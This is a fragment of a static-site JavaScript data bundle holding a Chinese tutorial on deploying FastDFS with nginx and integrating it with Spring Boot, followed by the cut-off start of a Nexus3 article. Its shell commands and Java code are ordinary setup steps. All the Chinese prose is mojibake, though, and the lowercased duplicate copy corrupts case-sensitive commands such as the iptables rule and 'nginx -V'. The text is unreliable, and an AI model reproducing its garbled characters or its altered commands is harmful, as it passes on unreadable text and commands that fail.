è®¿é®",charIndex:6038},{level:2,title:"éæSpringBoot",slug:"éæspringboot",normalizedTitle:"éæ springboot",charIndex:6662},{level:3,title:"å¼å¥ä¾èµ",slug:"å¼å¥ä¾èµ",normalizedTitle:"å¼å¥ä¾èµ",charIndex:6680},{level:3,title:"æ·»å éç½®",slug:"æ·»å éç½®",normalizedTitle:"æ·»å éç½®",charIndex:6845},{level:3,title:"Controller",slug:"controller",normalizedTitle:"controller",charIndex:7005},{level:3,title:"å®ç°",slug:"å®ç°",normalizedTitle:"å®ç°",charIndex:7317}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"å®è£FastDFS ç³»ç»è½¯ä»¶ ç¼è¯ç¯å¢ ç£çç®å½ å®è£libfastcommon å®è£FastDFS å®è£fastdfs-nginx-module åæºé¨ç½² trackeréç½® storageéç½® å¯å¨ tracker storage clientæµè¯ nginx éç½®è®¿é® åå¸å¼é¨ç½² storageéç½® clientæµè¯ éç½®nginxè®¿é® éæSpringBoot å¼å¥ä¾èµ æ·»å éç½® Controller å®ç°",content:'# å®è£ FastDFS\n\n\n# ç³»ç»è½¯ä»¶\n\nåç§°                     è¯´æ\ncentos                 7.x\nlibfastcommon          FastDFS åç¦»åºçä¸äºå¬ç¨å½æ°å\nFastDFS                FastDFS æ¬ä½\nfastdfs-nginx-module   FastDFS å nginx çå³èæ¨¡å\nnginx                  nginx-1.18.0\n\n\n# ç¼è¯ç¯å¢\n\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n\n\n1\n\n\nå¦æåºç°ä»¥ä¸éè¯¯\n\nLoaded plugins: fastestmirror\nLoading mirror speeds from cached hostfile\n * base: mirrors.cn99.com\n * centos-sclo-rh: mirrors.cn99.com\n * centos-sclo-sclo: mirrors.ustc.edu.cn\n * epel: ftp.yz.yamagata-u.ac.jp\n * extras: mirrors.cn99.com\n * updates: mirrors.cn99.com\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nä¿®æ¹å¦ä¸æä»¶\n\nvi /usr/libexec/urlgrabber-ext-down\n#æç¬¬ä¸è¡ç\n#!/usr/bin/python\n\n#ä¿®æ¹ä¸ºï¼ç¶åéæ°å®è£\n#!/usr/bin/python2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç£çç®å½\n\nè¯´æ                  ä½ç½®\nææå®è£å               /home/dfs/lib\næ°æ®å­å¨ä½ç½®              /home/dfs/store\nè¿éæä¸ºäºæ¹ä¾¿ææ¥å¿ä»ä¹çé½æ¾å°äº   /home/dfs/log\n\n\n# å®è£ libfastcommon\n\ngit clone https://github.com/happyfish100/libfastcommon.git --depth 1\ncd libfastcommon/\n./make.sh && ./make.sh install #ç¼è¯å®è£\n\n\n1\n2\n3\n\n\n\n# å®è£ FastDFS\n\ncd ../ #è¿åä¸ä¸çº§ç®å½\ngit clone https://github.com/happyfish100/fastdfs.git --depth 1\ncd fastdfs/\n./make.sh && ./make.sh install #ç¼è¯å®è£\n#éç½®æä»¶åå¤\ncp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\ncp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf #å®¢æ·ç«¯æä»¶ï¼æµè¯ç¨\ncp /home/dfs/lib/fastdfs/conf/http.conf /etc/fdfs/ #ä¾nginxè®¿é®ä½¿ç¨\ncp /home/dfs/lib/fastdfs/conf/mime.types /etc/fdfs/ #ä¾nginxè®¿é®ä½¿ç¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å®è£ fastdfs-nginx-module\n\ncd ../ #è¿åä¸ä¸çº§ç®å½\ngit clone https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1\ncp /home/dfs/lib/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs\n\n\n1\n2\n3\n\n\néå nginx ä½¿ç¨ï¼å³äº nginx å®è£è¿éå°±ä¸è¯´äºï¼å®è£å nginx éè¦éç½®å¦ä¸ï¼\n\n./configure --prefix=/home/nginx-1.18.0 --add-module=/home/dfs/lib/fastdfs-nginx-module/src\n\n\n1\n\n\n\n# åæºé¨ç½²\n\n\n# tracker éç½®\n\n#æå¡å¨ipä¸º 10.24x.3x.xx2\n#æå»ºè®®ç¨ftpä¸è½½ä¸æ¥è¿äºæä»¶ æ¬å°ä¿®æ¹\nvim /etc/fdfs/tracker.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=22122  # trackeræå¡å¨ç«¯å£ï¼é»è®¤22122,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # å­å¨æ¥å¿åæ°æ®çæ ¹ç®å½\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# storage éç½®\n\nvim /etc/fdfs/storage.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=23000  # storageæå¡ç«¯å£ï¼é»è®¤23000,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # æ°æ®åæ¥å¿æä»¶å­å¨æ ¹ç®å½\nstore_path0=/home/dfs/store  # ç¬¬ä¸ä¸ªå­å¨ç®å½\ntracker_server=10.24x.3x.xx2:22122  # trackeræå¡å¨IPåç«¯å£\nhttp.server_port=8888  # httpè®¿é®æä»¶çç«¯å£(é»è®¤8888,çæåµä¿®æ¹,ånginxä¸­ä¿æä¸è´)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# å¯å¨\n\n# tracker\n\n/etc/init.d/fdfs_trackerd start #å¯å¨trackeræå¡\n/etc/init.d/fdfs_trackerd restart #éå¯å¨trackeræå¡\n/etc/init.d/fdfs_trackerd stop #åæ­¢trackeræå¡\nchkconfig fdfs_trackerd on #èªå¯å¨trackeræå¡\n\n\n1\n2\n3\n4\n\n\n# storage\n\n/etc/init.d/fdfs_storaged start #å¯å¨storageæå¡\n/etc/init.d/fdfs_storaged restart #éå¨storageæå¡\n/etc/init.d/fdfs_storaged stop #åæ­¢å¨storageæå¡\nchkconfig fdfs_storaged on #èªå¯å¨storageæå¡\n\n\n1\n2\n3\n4\n\n\n\n# client æµè¯\n\nè¿å groupX ææå°±æ¯æåäºï¼æä»¶è¢«éæ°æ¹åå­å¹¶ä¸è¢«æ¾å¨äºæä¸ªå°æ¹\n\nvim /etc/fdfs/client.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nbase_path=/home/dfs/log\ntracker_server=10.24x.3x.xx2:22122    #trackeræå¡å¨IPåç«¯å£\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä¸ç¥éå¯ä»¥ç¨ä»¥ä¸å½ä»¤æ¥ææ¾\n\n[root@node102 home]# find / -name CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n/home/dfs/store/data/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n\n\n\n# nginx éç½®è®¿é®\n\nvim /etc/fdfs/mod_fastdfs.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\ntracker_server=10.24x.3x.xx2:22122  #trackeræå¡å¨IPåç«¯å£\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#éç½®nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#æ·»å å¦ä¸éç½®\nserver {\n    listen       8888;    ## è¯¥ç«¯å£ä¸ºstorage.confä¸­çhttp.server_portç¸å\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n# åæ8888ç«¯å£æå¼\n/sbin/iptables -I INPUT -p tcp --dport 8888 -j ACCEPT\n#æµè¯ä¸è½½ï¼ç¨å¤é¨æµè§å¨è®¿é®åæå·²ä¼ è¿çnginxå®è£å,å¼ç¨è¿åçID\nhttp://10.24x.3x.xx2:8888/group1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nå¦æ nginx å¯å¨ unknown directive "ngx_fastdfs_module"ï¼åæ¯å®è£ nginx --add-module=/home/dfs/lib/fastdfs-nginx-module/src å¤±è´¥ï¼å¯ä»¥ç¨./nginx -V æ¥çã\n\n[root@node102 sbin]# ./nginx -V\nnginx version: nginx/1.18.0\nbuilt by gcc 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC) \nbuilt with OpenSSL 1.0.2k-fips  26 Jan 2017\nTLS SNI support enabled\nconfigure arguments: --add-module=/home/dfs/lib/fastdfs-nginx-module/src --prefix=/home/nginx-1.18.0 --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module --with-pcre=/home/pcre-8.35\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åå¸å¼é¨ç½²\n\n\n# storage éç½®\n\ntracker éç½® ååæºé¨ç½²æ¯ä¸æ ·çä¸åï¼åªéè¦æ¹å storage éç½®\n\nvim /etc/fdfs/storage.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=23000  # storageæå¡ç«¯å£ï¼é»è®¤23000,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # æ°æ®åæ¥å¿æä»¶å­å¨æ ¹ç®å½\nstore_path0=/home/dfs/store  # ç¬¬ä¸ä¸ªå­å¨ç®å½\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\nhttp.server_port=8888  # httpè®¿é®æä»¶çç«¯å£(é»è®¤8888,çæåµä¿®æ¹,ånginxä¸­ä¿æä¸è´)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# client æµè¯\n\nvim /etc/fdfs/client.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nbase_path=/home/moe/dfs\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\n# ä¿å­éåº\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# éç½® nginx è®¿é®\n\nvim /etc/fdfs/mod_fastdfs.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#éç½®nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#æ·»å å¦ä¸éç½®\nserver {\n    listen       8888;    ## è¯¥ç«¯å£ä¸ºstorage.confä¸­çhttp.server_portç¸å\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# éæ SpringBoot\n\n\n# å¼å¥ä¾èµ\n\n<dependency>\n    <groupId>com.github.tobato</groupId>\n    <artifactId>fastdfs-client</artifactId>\n    <version>1.26.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# æ·»å éç½®\n\nfdfs:\n  # è¿æ¥çè¶æ¶æ¶é´\n  connect-timeout: 3000\n  # è¯»åçè¶æ¶æ¶é´\n  so-timeout: 3000\n  #trackeræå¡æå¨çipå°ååç«¯å£å·\n  tracker-list: 10.240.3x.xx2:22122\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Controller\n\n@RestController\n@RequestMapping("/img")\npublic class ImgController {\n\n    @Autowired\n    private ImgServer imgServer;\n\n    @PostMapping("/push")\n    public ResponseData push(@RequestParam("file") MultipartFile file){\n        return imgServer.push(file);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# å®ç°\n\n@Service\n@Slf4j\npublic class ImgServerImpl implements ImgServer {\n    @Autowired\n    FastFileStorageClient fastFileStorageClient;\n\n    @Override\n    public ResponseData<String> push(MultipartFile file) {\n        if (file.isEmpty()) {\n            return ResponseData.failureResponse(UploadFileCode.UPLOAD_FILE_CODE_1000);\n        }\n        try {\n            log.info("å¼å§ä¸ä¼  {}", file.getOriginalFilename());\n            String fileSuffix = file.getOriginalFilename().substring(file.getOriginalFilename().lastIndexOf(".")+1);\n            StorePath storePath = fastFileStorageClient.uploadFile(file.getInputStream(), file.getSize(),fileSuffix, null);\n            String path = storePath.getFullPath();\n            log.info("ä¸ä¼ æå");\n            return ResponseData.successResponse(path);\n        } catch (IOException e) {\n            log.error(e.toString(), e);\n            return ResponseData.failureResponse(UploadFileCode.UPLOAD_FILE_CODE_1001.getCode(), e.toString());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n',normalizedContent:'# å®è£ fastdfs\n\n\n# ç³»ç»è½¯ä»¶\n\nåç§°                     è¯´æ\ncentos                 7.x\nlibfastcommon          fastdfs åç¦»åºçä¸äºå¬ç¨å½æ°å\nfastdfs                fastdfs æ¬ä½\nfastdfs-nginx-module   fastdfs å nginx çå³èæ¨¡å\nnginx                  nginx-1.18.0\n\n\n# ç¼è¯ç¯å¢\n\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n\n\n1\n\n\nå¦æåºç°ä»¥ä¸éè¯¯\n\nloaded plugins: fastestmirror\nloading mirror speeds from cached hostfile\n * base: mirrors.cn99.com\n * centos-sclo-rh: mirrors.cn99.com\n * centos-sclo-sclo: mirrors.ustc.edu.cn\n * epel: ftp.yz.yamagata-u.ac.jp\n * extras: mirrors.cn99.com\n * updates: mirrors.cn99.com\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nä¿®æ¹å¦ä¸æä»¶\n\nvi /usr/libexec/urlgrabber-ext-down\n#æç¬¬ä¸è¡ç\n#!/usr/bin/python\n\n#ä¿®æ¹ä¸ºï¼ç¶åéæ°å®è£\n#!/usr/bin/python2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç£çç®å½\n\nè¯´æ                  ä½ç½®\nææå®è£å               /home/dfs/lib\næ°æ®å­å¨ä½ç½®              /home/dfs/store\nè¿éæä¸ºäºæ¹ä¾¿ææ¥å¿ä»ä¹çé½æ¾å°äº   /home/dfs/log\n\n\n# å®è£ libfastcommon\n\ngit clone https://github.com/happyfish100/libfastcommon.git --depth 1\ncd libfastcommon/\n./make.sh && ./make.sh install #ç¼è¯å®è£\n\n\n1\n2\n3\n\n\n\n# å®è£ fastdfs\n\ncd ../ #è¿åä¸ä¸çº§ç®å½\ngit clone https://github.com/happyfish100/fastdfs.git --depth 1\ncd fastdfs/\n./make.sh && ./make.sh install #ç¼è¯å®è£\n#éç½®æä»¶åå¤\ncp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\ncp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf #å®¢æ·ç«¯æä»¶ï¼æµè¯ç¨\ncp /home/dfs/lib/fastdfs/conf/http.conf /etc/fdfs/ #ä¾nginxè®¿é®ä½¿ç¨\ncp /home/dfs/lib/fastdfs/conf/mime.types /etc/fdfs/ #ä¾nginxè®¿é®ä½¿ç¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å®è£ fastdfs-nginx-module\n\ncd ../ #è¿åä¸ä¸çº§ç®å½\ngit clone https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1\ncp /home/dfs/lib/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs\n\n\n1\n2\n3\n\n\néå nginx ä½¿ç¨ï¼å³äº nginx å®è£è¿éå°±ä¸è¯´äºï¼å®è£å nginx éè¦éç½®å¦ä¸ï¼\n\n./configure --prefix=/home/nginx-1.18.0 --add-module=/home/dfs/lib/fastdfs-nginx-module/src\n\n\n1\n\n\n\n# åæºé¨ç½²\n\n\n# tracker éç½®\n\n#æå¡å¨ipä¸º 10.24x.3x.xx2\n#æå»ºè®®ç¨ftpä¸è½½ä¸æ¥è¿äºæä»¶ æ¬å°ä¿®æ¹\nvim /etc/fdfs/tracker.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=22122  # trackeræå¡å¨ç«¯å£ï¼é»è®¤22122,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # å­å¨æ¥å¿åæ°æ®çæ ¹ç®å½\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# storage éç½®\n\nvim /etc/fdfs/storage.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=23000  # storageæå¡ç«¯å£ï¼é»è®¤23000,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # æ°æ®åæ¥å¿æä»¶å­å¨æ ¹ç®å½\nstore_path0=/home/dfs/store  # ç¬¬ä¸ä¸ªå­å¨ç®å½\ntracker_server=10.24x.3x.xx2:22122  # trackeræå¡å¨ipåç«¯å£\nhttp.server_port=8888  # httpè®¿é®æä»¶çç«¯å£(é»è®¤8888,çæåµä¿®æ¹,ånginxä¸­ä¿æä¸è´)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# å¯å¨\n\n# tracker\n\n/etc/init.d/fdfs_trackerd start #å¯å¨trackeræå¡\n/etc/init.d/fdfs_trackerd restart #éå¯å¨trackeræå¡\n/etc/init.d/fdfs_trackerd stop #åæ­¢trackeræå¡\nchkconfig fdfs_trackerd on #èªå¯å¨trackeræå¡\n\n\n1\n2\n3\n4\n\n\n# storage\n\n/etc/init.d/fdfs_storaged start #å¯å¨storageæå¡\n/etc/init.d/fdfs_storaged restart #éå¨storageæå¡\n/etc/init.d/fdfs_storaged stop #åæ­¢å¨storageæå¡\nchkconfig fdfs_storaged on #èªå¯å¨storageæå¡\n\n\n1\n2\n3\n4\n\n\n\n# client æµè¯\n\nè¿å groupx ææå°±æ¯æåäºï¼æä»¶è¢«éæ°æ¹åå­å¹¶ä¸è¢«æ¾å¨äºæä¸ªå°æ¹\n\nvim /etc/fdfs/client.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nbase_path=/home/dfs/log\ntracker_server=10.24x.3x.xx2:22122    #trackeræå¡å¨ipåç«¯å£\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä¸ç¥éå¯ä»¥ç¨ä»¥ä¸å½ä»¤æ¥ææ¾\n\n[root@node102 home]# find / -name cvaezl_r4usafhxsaaacuytz3no8807.sh\n/home/dfs/store/data/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n\n\n\n# nginx éç½®è®¿é®\n\nvim /etc/fdfs/mod_fastdfs.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\ntracker_server=10.24x.3x.xx2:22122  #trackeræå¡å¨ipåç«¯å£\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#éç½®nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#æ·»å å¦ä¸éç½®\nserver {\n    listen       8888;    ## è¯¥ç«¯å£ä¸ºstorage.confä¸­çhttp.server_portç¸å\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n# åæ8888ç«¯å£æå¼\n/sbin/iptables -i input -p tcp --dport 8888 -j accept\n#æµè¯ä¸è½½ï¼ç¨å¤é¨æµè§å¨è®¿é®åæå·²ä¼ è¿çnginxå®è£å,å¼ç¨è¿åçid\nhttp://10.24x.3x.xx2:8888/group1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nå¦æ nginx å¯å¨ unknown directive "ngx_fastdfs_module"ï¼åæ¯å®è£ nginx --add-module=/home/dfs/lib/fastdfs-nginx-module/src å¤±è´¥ï¼å¯ä»¥ç¨./nginx -v æ¥çã\n\n[root@node102 sbin]# ./nginx -v\nnginx version: nginx/1.18.0\nbuilt by gcc 9.3.1 20200408 (red hat 9.3.1-2) (gcc) \nbuilt with openssl 1.0.2k-fips  26 jan 2017\ntls sni support enabled\nconfigure arguments: --add-module=/home/dfs/lib/fastdfs-nginx-module/src --prefix=/home/nginx-1.18.0 --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module --with-pcre=/home/pcre-8.35\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åå¸å¼é¨ç½²\n\n\n# storage éç½®\n\ntracker éç½® ååæºé¨ç½²æ¯ä¸æ ·çä¸åï¼åªéè¦æ¹å storage éç½®\n\nvim /etc/fdfs/storage.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=23000  # storageæå¡ç«¯å£ï¼é»è®¤23000,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # æ°æ®åæ¥å¿æä»¶å­å¨æ ¹ç®å½\nstore_path0=/home/dfs/store  # ç¬¬ä¸ä¸ªå­å¨ç®å½\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\nhttp.server_port=8888  # httpè®¿é®æä»¶çç«¯å£(é»è®¤8888,çæåµä¿®æ¹,ånginxä¸­ä¿æä¸è´)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# client æµè¯\n\nvim /etc/fdfs/client.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nbase_path=/home/moe/dfs\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\n# ä¿å­éåº\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# éç½® nginx è®¿é®\n\nvim /etc/fdfs/mod_fastdfs.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#éç½®nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#æ·»å å¦ä¸éç½®\nserver {\n    listen       8888;    ## è¯¥ç«¯å£ä¸ºstorage.confä¸­çhttp.server_portç¸å\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# éæ springboot\n\n\n# å¼å¥ä¾èµ\n\n<dependency>\n    <groupid>com.github.tobato</groupid>\n    <artifactid>fastdfs-client</artifactid>\n    <version>1.26.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# æ·»å éç½®\n\nfdfs:\n  # è¿æ¥çè¶æ¶æ¶é´\n  connect-timeout: 3000\n  # è¯»åçè¶æ¶æ¶é´\n  so-timeout: 3000\n  #trackeræå¡æå¨çipå°ååç«¯å£å·\n  tracker-list: 10.240.3x.xx2:22122\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# controller\n\n@restcontroller\n@requestmapping("/img")\npublic class imgcontroller {\n\n    @autowired\n    private imgserver imgserver;\n\n    @postmapping("/push")\n    public responsedata push(@requestparam("file") multipartfile file){\n        return imgserver.push(file);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# å®ç°\n\n@service\n@slf4j\npublic class imgserverimpl implements imgserver {\n    @autowired\n    fastfilestorageclient fastfilestorageclient;\n\n    @override\n    public responsedata<string> push(multipartfile file) {\n        if (file.isempty()) {\n            return responsedata.failureresponse(uploadfilecode.upload_file_code_1000);\n        }\n        try {\n            log.info("å¼å§ä¸ä¼  {}", file.getoriginalfilename());\n            string filesuffix = file.getoriginalfilename().substring(file.getoriginalfilename().lastindexof(".")+1);\n            storepath storepath = fastfilestorageclient.uploadfile(file.getinputstream(), file.getsize(),filesuffix, null);\n            string path = storepath.getfullpath();\n            log.info("ä¸ä¼ æå");\n            return responsedata.successresponse(path);\n        } catch (ioexception e) {\n            log.error(e.tostring(), e);\n            return responsedata.failureresponse(uploadfilecode.upload_file_code_1001.getcode(), e.tostring());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n',charsets:{cjk:!0}},{title:"ä½¿ç¨ Nexus3.x æ­å»ºç§æ",frontmatter:{title:"ä½¿ç¨ Nexus3.x æ­å»ºç§æ",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2302/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/2300.maven/2302.%E4%BD%BF%E7%94%A8%20Nexus3.x%20%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%8D.html",relativePath:"00.java/2300.maven/2302.ä½¿ç¨ Nexus3.x æ­å»ºç§æ.md",key:"v-5783fd5e",path:"/maven/2302/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:'ä¸è½½å°å https://help.sonatype.com/repomanager3/product-information/downloadï¼ä¸è½½å¥½åè¿è¡è§£åç¼©ä¼å¾å°ä¸¤ä¸ªæä»¶ï¼nexus-3.39.0-01 å sonatype-workãå¯ä»¥éç½® nexus åéå°æä»¬çç¯å¢ä¸­æ¹ä¾¿å¯å¨ï¼ä¹å¯ä»¥ä¸éç½®æ¯æ¬¡é½å° nexus-3.39.0-01/bin ä¸å»å¯å¨ã\n\nNEXUS_HOME: /opt/software/nexus3/nexus-3.39.0-01/\nPATH: %NEXUS_HOME%/bin\n\n\n1\n2\n\n\nnexus é»è®¤ä½¿ç¨çæ¯ 8081 ç«¯å£ï¼å¾å¤å¾®æå¡çç«¯å£é½ä¼ä» 8080 ç­å¼å§ä½¿ç¨ï¼å¯ä»¥ä¿®æ¹ nexus çç«¯å£ï¼å·ä½ä½ç½®æä»¶ä¸º /opt/software/nexus3/nexus-3.39.0-01/etc/nexus-default.properties\n\nå¯å¨ nexus å½ä»¤\n\n./nexus {start|stop|run|run-redirect|status|restart|force-reload}\n\n# æç¤ºä¿¡æ¯\nWARNING: ************************************************************\nWARNING: Detected execution as "root" user.  This is NOT recommended!\nWARNING: ************************************************************\n\n# è¿ä¸ªä¿¡æ¯éè¦ä¿®æ¹ /opt/software/nexus3/nexus-3.39.0-01/bin/nexus æä»¶ï¼æ¾å° 